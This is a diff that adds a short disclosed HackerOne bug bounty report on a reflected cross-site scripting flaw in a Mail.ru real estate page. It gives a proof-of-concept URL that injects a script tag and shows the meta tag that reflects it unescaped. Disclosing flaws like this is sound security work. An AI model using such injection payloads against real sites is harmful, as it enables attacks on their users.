@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/51060
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:02.05.2015 17:33:59
+
+Summary:
+
+The XSS vulnerability is located here:
+
+```
+https://realty.mail.ru/remont/article/9618.html/tttt%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
+```
+
+It is caused by the full URL being loaded like so: 
+
+```html
+<meta property="og:url" content="https://realty.mail.ru/remont/article/9618.html/tttt">
+<script>
+    alert(0)
+</script>">
+```
+
+I am aware that this is out of scope, but I am still reporting it since I just happened to spot it while looking for other bugs. 
